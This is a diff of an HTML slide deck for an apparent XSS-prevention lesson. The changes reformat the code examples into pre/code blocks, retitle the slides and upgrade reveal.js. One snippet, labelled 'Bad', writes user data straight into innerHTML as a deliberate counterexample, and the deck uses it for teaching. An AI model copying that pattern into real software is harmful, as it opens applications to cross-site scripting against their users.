-&lt;!-- SECURE: Safe data handling --&gt;<br>
-// Good: Validate data on client and server<br>
-function displayUserData(data) {<br>
-&nbsp;&nbsp;if (!isValidUserData(data)) return;<br>
-&nbsp;&nbsp;document.getElementById('user-info').textContent = data.name;<br>}<br><br>
-// Bad: Direct DOM manipulation<br>
-document.getElementById('user-info').innerHTML = data.name;
+                    <pre><code class="language-javascript">&lt;!-- SECURE: Safe data handling --&gt;
+// Good: Validate data on client and server
+function displayUserData(data) {
+  if (!isValidUserData(data)) return;
+  document.getElementById('user-info').textContent = data.name;
+}
+// Bad: Direct DOM manipulation
+document.getElementById('user-info').innerHTML = data.name;</code></pre>
                 </div>
 
                 <h3>2. Safe API Integration</h3>
                 <div class="code-example">
-&lt;!-- SECURE: Safe API calls --&gt;<br>
-fetch('/api/user-data')<br>
-&nbsp;&nbsp;.then(response => response.json())<br>
-&nbsp;&nbsp;.then(data => {<br>
-&nbsp;&nbsp;&nbsp;&nbsp;if (validateApiData(data)) {<br>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;displayData(data);<br>
-&nbsp;&nbsp;&nbsp;&nbsp;}<br>
-&nbsp;&nbsp;})<br>
-&nbsp;&nbsp;.catch(error => console.error('API Error:', error));
+                    <pre><code class="language-javascript">&lt;!-- SECURE: Safe API calls --&gt;
+fetch('/api/user-data')
+  .then(response =&gt; response.json())
+  .then(data =&gt; {
+    if (validateApiData(data)) {
+      displayData(data);
+    }
+  })
+  .catch(error =&gt; console.error('API Error:', error));</code></pre>
                 </div>
             </section>
 
-            <!-- Slide 26: Testing and Validation -->
-            <section>
+            <section data-slide-title="Testing and Validation">
                 <h2>Testing and Validation</h2>
                 
                 <h3>1. Automated XSS Testing</h3>
                 <div class="code-example">
-&lt;!-- Security testing tools --&gt;<br>
-npm install --save-dev eslint-plugin-security<br>
-npm install --save-dev xss<br><br>
-// Run security audit<br>
-npm audit<br>
-eslint --ext .js --plugin security .
+                    <pre><code class="language-plaintext">&lt;!-- Security testing tools --&gt;
+npm install --save-dev eslint-plugin-security
+npm install --save-dev xss
+// Run security audit
+npm audit
+eslint --ext .js --plugin security .</code></pre>
                 </div>
 
                 <h3>2. Manual Testing Checklist</h3>
@@ -782,8 +507,7 @@ eslint --ext .js --plugin security .
                 </ul>
             </section>
 
-            <!-- Slide 27: Career Development -->
-            <section>
+            <section data-slide-title="Career Development in Web Security">
                 <h2>Career Development in Web Security</h2>
                 <div class="career-box">
                     <h3>Next Steps:</h3>
@@ -798,8 +522,7 @@ eslint --ext .js --plugin security .
                 </div>
             </section>
 
-            <!-- Task 2: Secure Implementation -->
-            <section>
+            <section data-slide-title="Task 2: Secure XSS Prevention Implementation">
                 <h2>Task 2: Secure XSS Prevention Implementation</h2>
                 <div class="task-box">
                     <h3>Objective:</h3>
@@ -821,8 +544,7 @@ eslint --ext .js --plugin security .
                 </div>
             </section>
 
-            <!-- Slide 28: Further Activity -->
-            <section>
+            <section data-slide-title="Further Activity: Code Inspection">
                 <h2>Further Activity: Code Inspection</h2>
                 <div class="os3-studio">
                     <h3>Advanced Students - Code Analysis:</h3>
@@ -838,8 +560,7 @@ eslint --ext .js --plugin security .
                 </div>
             </section>
 
-            <!-- Slide 29: Summary -->
-            <section>
+            <section data-slide-title="Session Summary">
                 <h2>Session Summary</h2>
                 <div class="highlight">
                     <h3>Key Takeaways:</h3>
@@ -854,66 +575,39 @@ eslint --ext .js --plugin security .
                 </div>
             </section>
 
-            <!-- Slide 30: Next Steps -->
-            <section class="center">
+            <section class="center" data-slide-title="Next Steps">
                 <h2>Next Steps</h2>
-                <div class="timeline-info">
-                    <h3>Continue Learning:</h3>
-                    <ul>
-                        <li>Complete the OS³ Studio tasks</li>
-                        <li>Explore additional XSS techniques</li>
-                        <li>Practice with security testing tools</li>
-                        <li>Consider industry certifications</li>
-                        <li>Join cybersecurity communities</li>
-                    </ul>
-                    <p><strong>Next Session:</strong> WEB-CSRF-01 & WEB-CONFIG-01 - CSRF and Misconfiguration</p>
-                </div>
+                
             </section>
+
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.3.1/dist/reveal.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@5.0.4/dist/reveal.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@5.0.4/plugin/notes/notes.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@5.0.4/plugin/markdown/markdown.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@5.0.4/plugin/highlight/highlight.js"></script>
+
     <script>
+        
+        // Prevent wheel events from changing slides when scrolling within scrollable content
+        document.addEventListener('DOMContentLoaded', function() {
+            const scrollableElements = document.querySelectorAll('.reveal pre, .reveal .code-example, .reveal .task-box, .reveal .info-box, .reveal .warning-box, [style*="overflow"]');
+            
+            scrollableElements.forEach(function(element) {
+                element.addEventListener('wheel', function(e) {
+                    e.stopPropagation();
+                }, { passive: true });
+            });
+        });
         Reveal.initialize({
             hash: true,
-            transition: 'slide',
-            transitionSpeed: 'default',
-            backgroundTransition: 'fade',
-            controls: true,
-            progress: true,
+            slideNumber: true,
+            transition: 'none',
+            backgroundTransition: 'none',
             center: false,
-            touch: true,
-            loop: false,
-            rtl: false,
-            navigationMode: 'default',
-            shuffle: false,
-            fragments: true,
-            fragmentInURL: false,
-            embedded: false,
-            help: true,
-            showNotes: false,
-            autoPlayMedia: false,
-            preloadIframes: null,
-            autoAnimate: true,
-            autoAnimateMatcher: null,
-            autoAnimateEasing: 'ease',
-            autoAnimateDuration: 1.0,
-            autoAnimateUnmatched: true,
-            autoSlide: 0,
-            autoSlideStoppable: true,
-            autoSlideMethod: null,
-            defaultTiming: null,
-            mouseWheel: false,
-            previewLinks: false,
-            postMessage: true,
-            postMessageEvents: false,
-            focusBodyOnPageVisibilityChange: true,
-            width: '100%',
-            height: '100%',
-            margin: 0.04,
-            minScale: 0.2,
-            maxScale: 2.0,
-            disableLayout: false
+            disableLayout: true,
+            plugins: [RevealMarkdown, RevealHighlight, RevealNotes]
         });
     </script>
 </body>
